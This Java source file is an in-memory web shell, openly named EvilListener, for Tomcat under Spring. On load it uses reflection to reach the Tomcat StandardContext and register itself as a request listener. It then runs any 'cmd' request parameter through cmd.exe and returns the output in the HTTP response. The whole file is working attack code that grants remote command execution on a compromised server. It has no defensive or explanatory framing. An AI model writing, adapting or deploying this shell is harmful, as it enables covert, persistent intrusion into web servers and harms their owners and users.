import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;

import java.lang.reflect.Field;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;

public class EvilListener implements ServletRequestListener {
    static {
        try {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT",0);
            ServletContext servletContext = context.getServletContext();
            StandardContext o = null;
            // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
            while (o == null) {
                Field f = servletContext.getClass().getDeclaredField("context");
                f.setAccessible(true);
                Object object = f.get(servletContext);

                if (object instanceof ServletContext) {
                    servletContext = (ServletContext) object;
                } else if (object instanceof StandardContext) {
                    o = (StandardContext) object;
                }
            }
            EvilListener a = new EvilListener("a");
            o.addApplicationEventListener(a);
            System.out.println("Success");
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public EvilListener(String a){

    }
    public ServletResponse response;
    public ServletRequest request;

    public EvilListener(ServletRequest request, ServletResponse response) {
        this.request = request;
        this.response = response;
    }


    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
        ServletRequestListener.super.requestDestroyed(sre);
    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
        if (req.getParameter("cmd") != null){
            InputStream in = null;

            try {
                in = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",req.getParameter("cmd")}).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String out = s.hasNext()?s.next():"";
                Field requestF = req.getClass().getDeclaredField("request");
                requestF.setAccessible(true);
                Request request = (Request)requestF.get(req);
                Response resp = request.getResponse();
                resp.getWriter().write(out);
                resp.getWriter().flush();
            }catch (Exception e){
                e.printStackTrace();
            }
        }
        ServletRequestListener.super.requestInitialized(sre);
    }

    public static void main(String[] args) {
        System.out.println(1);
    }
}
